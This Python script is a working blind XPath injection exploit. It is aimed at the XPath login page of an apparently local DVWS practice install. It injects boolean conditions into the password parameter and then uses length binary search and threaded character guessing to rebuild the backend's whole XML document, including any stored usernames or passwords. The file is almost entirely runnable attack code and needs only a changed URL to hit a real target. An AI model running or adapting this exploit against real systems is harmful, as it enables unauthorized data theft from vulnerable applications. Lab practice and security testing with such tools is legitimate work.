from math import ceil
import string
import concurrent.futures
import xml.etree.ElementTree as ET
from xml.etree.ElementTree import Element
from dataclasses import dataclass
from enum import Enum

import requests


NUMBER_OF_THREADS = 10
MAX_SIZE = 100


def inject(injection: str) -> bool:
    """
    Function that returns True in the case of a success condition
    """
    url = "http://127.0.0.1:80/dvws/vulnerabilities/xpath/xpath.php"
    username = "admin"
    password = f"admin' or {injection} and 'b'='b"
    params = {"login": username, "password": password, "form": "submit"}
    try:
        resp = requests.get(url, params=params)
    except requests.ConnectionError:
        print(f"Connection error when testing: {injection}")
        return False
    return "Accepted User" in resp.text


class NodeType(Enum):
    ELEMENT = "element"
    TEXT = "text"


class Node:
    def __init__(self, nodepath: str) -> None:
        self.path = nodepath

    def _get_length_query(self, nodetype: NodeType, condition: str) -> str:
        if nodetype == NodeType.ELEMENT:
            return f"string-length(name({self.path})){condition}"
        elif nodetype == NodeType.TEXT:
            return f"string-length({self.path}){condition}"

    def _extract_length(self, nodetype: NodeType) -> int:
        zero_check = self._get_length_query(nodetype, "=0")
        if inject(zero_check):
            return 0
        max_query = self._get_length_query(nodetype, f"<{MAX_SIZE + 1}")
        if not inject(max_query):
            raise ValueError(
                f"Max length for {nodetype} {self.path} is over {MAX_SIZE}"
            )
        current_max_length_to_test = 10
        min_length = 1
        max_length = MAX_SIZE
        while max_length > min_length:
            query = self._get_length_query(nodetype, f"<{current_max_length_to_test}")
            if inject(query):
                max_length = current_max_length_to_test - 1
            else:
                min_length = current_max_length_to_test
            current_max_length_to_test = ceil(
                min_length + (max_length - min_length) / 2
            )
        return max_length

    def _get_charset(self, nodetype: NodeType) -> str:
        if nodetype == NodeType.ELEMENT:
            return string.ascii_lowercase + string.ascii_uppercase + "0123456789" + "."
        elif nodetype == NodeType.TEXT:
            return string.printable[:-2]

    def _get_extract_char_query(
        self, nodetype: NodeType, index_to_extract: int, comparison_char: str
    ) -> str:
        if nodetype == NodeType.TEXT and comparison_char == "'":
            return f'substring({self.path},{index_to_extract},1)="\'"'
        elif nodetype == NodeType.ELEMENT:
            return (
                f"substring(name({self.path}),{index_to_extract},1)='{comparison_char}'"
            )
        elif nodetype == NodeType.TEXT:
            return f"substring({self.path},{index_to_extract},1)='{comparison_char}'"

    def _extract_char(self, index_to_extract: int, nodetype: NodeType) -> str:
        charspace = self._get_charset(nodetype)
        for char in charspace:
            query = self._get_extract_char_query(nodetype, index_to_extract, char)
            if inject(query):
                return char
        raise ValueError(
            f"Char for element {self.path} at index {index_to_extract} not found"
        )

    def _get_number_of_children_query(self, condition: str) -> str:
        return f"count({self.path}/*){condition}"

    def extract_number_of_children(self) -> int:
        no_children_check = self._get_number_of_children_query("=0")
        if inject(no_children_check):
            return 0
        max_query = self._get_number_of_children_query(f"<{MAX_SIZE + 1}")
        if not inject(max_query):
            raise ValueError(f"More than {MAX_SIZE} children")

        current_num_of_children_to_test = 10
        min_number_of_children = 1
        max_number_of_children = MAX_SIZE
        while max_number_of_children > min_number_of_children:
            query = self._get_number_of_children_query(
                f"<{current_num_of_children_to_test}"
            )
            if inject(query):
                max_number_of_children = current_num_of_children_to_test - 1
            else:
                min_number_of_children = current_num_of_children_to_test
            current_num_of_children_to_test = ceil(
                min_number_of_children
                + (max_number_of_children - min_number_of_children) / 2
            )
        return max_number_of_children

    def extract_data(self, nodetype: NodeType) -> str:
        length = self._extract_length(nodetype=nodetype)
        if length == 0:
            return ""
        start_index = 1
        end_index = start_index + NUMBER_OF_THREADS
        output = ""
        while True:
            if end_index > length + 1:
                end_index = length + 1
            with concurrent.futures.ThreadPoolExecutor() as executor:
                futures = [
                    executor.submit(self._extract_char, index, nodetype)
                    for index in range(start_index, end_index)
                ]
            output += "".join([f.result() for f in futures])
            print(output, end="\r", flush=True)
            if end_index == length + 1:
                break
            start_index = end_index
            end_index = start_index + NUMBER_OF_THREADS
        assert self.verify_string(output, nodetype=nodetype)
        print()
        return output

    def _get_verify_string_query(self, nodetype: NodeType, string_to_test: str) -> str:
        if nodetype == NodeType.ELEMENT:
            return f"name({self.path})='{string_to_test}'"
        elif nodetype == NodeType.TEXT:
            return f"{self.path}='{string_to_test}'"

    def verify_string(self, string_to_verify: str, nodetype: NodeType) -> bool:
        query = self._get_verify_string_query(nodetype, string_to_verify)
        if inject(query):
            return True
        else:
            return False


@dataclass
class XMLNode:
    ET_element: Element
    parent_ET_element: Element | None
    element_path: str
    number_of_children: int


class XMLReconstructor:
    def __init__(
        self,
        cached_elements: set[str] = set(),
        cached_text: set[str] = set(),
    ) -> None:
        self.root_element_path = "/*"
        self.cached_elements = cached_elements
        self.cached_text = cached_text
        root_xml_node = self.gen_xml_node(self.root_element_path, None)
        self.root_ET_element = root_xml_node.ET_element
        self.not_done_queue: list[XMLNode] = [root_xml_node]

    def gen_xml_node(
        self, element_path: str, parent_ET_element: Element | None
    ) -> XMLNode:
        node = Node(element_path)
        for path in self.cached_elements:
            if node.verify_string(path, nodetype=NodeType.ELEMENT):
                element_name = path
                break
        else:
            element_name = node.extract_data(nodetype=NodeType.ELEMENT)
        self.cached_elements.add(element_name)
        ET_element = ET.Element(element_name)
        number_of_children = node.extract_number_of_children()
        xml_node = XMLNode(
            ET_element=ET_element,
            parent_ET_element=parent_ET_element,
            element_path=element_path,
            number_of_children=number_of_children,
        )
        return xml_node

    @staticmethod
    def add_ET_element(
        parent: Element | None, ET_element: Element, text: str | None = None
    ) -> None:
        if parent == None:
            return
        if text:
            ET_element.text = text
        parent.append(ET_element)

    def process_xml_node_from_stack(self) -> None:
        xml_node_to_process = self.not_done_queue.pop(0)
        node = Node(xml_node_to_process.element_path)
        if xml_node_to_process.number_of_children == 0:
            for path in self.cached_text:
                if node.verify_string(path, nodetype=NodeType.TEXT):
                    text = path
                    break
            else:
                text = node.extract_data(nodetype=NodeType.TEXT)
            if node.path == self.root_element_path:
                xml_node_to_process.ET_element.text = text
                return
            self.add_ET_element(
                parent=xml_node_to_process.parent_ET_element,
                ET_element=xml_node_to_process.ET_element,
                text=text,
            )
            return

        self.add_ET_element(
            parent=xml_node_to_process.parent_ET_element,
            ET_element=xml_node_to_process.ET_element,
        )

        self.add_children(xml_node_to_process)

    def add_children(self, parent_xml_node: XMLNode) -> None:
        number_of_children = parent_xml_node.number_of_children
        parent_element_path = parent_xml_node.element_path
        parent_ET_element = parent_xml_node.ET_element
        for i in range(number_of_children):
            child_path = parent_element_path + f"/*[{i+1}]"
            child_xml_node = self.gen_xml_node(
                element_path=child_path, parent_ET_element=parent_ET_element
            )
            self.not_done_queue.append(child_xml_node)

    def build_xml(
        self, output_to_file: bool = False, filename: str = "output.xml"
    ) -> None:
        while self.not_done_queue:
            self.process_xml_node_from_stack()
        ET.indent(self.root_ET_element)
        ET.dump(self.root_ET_element)
        if output_to_file:
            xml_document = ET.ElementTree(self.root_ET_element)
            xml_document.write(filename)


def main() -> None:
    XMLReconstructor().build_xml()


if __name__ == "__main__":
    main()
